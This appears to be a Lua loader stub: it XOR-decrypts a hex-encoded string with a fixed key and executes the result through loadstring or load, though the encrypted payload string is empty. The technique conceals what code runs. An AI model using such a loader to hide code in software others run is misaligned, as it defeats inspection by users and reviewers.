local k={15,94,122,232,167,76,67,9,223,35,122,111,84,102,8,16,169,23,6,223,91,16,76,111,45,129,164,137,145,54,122,114}
local s=[[]]
local t={}
local n=0
for i=1,#s,2 do
	n=n+1
	local v=tonumber(s:sub(i,i+1),16)
	t[n]=string.char(bit32.bxor(v,k[((n-1)%#k)+1]))
end
local c=loadstring or load
local fn,err=c(table.concat(t))
if not fn then error(tostring(err),0) end
return fn()
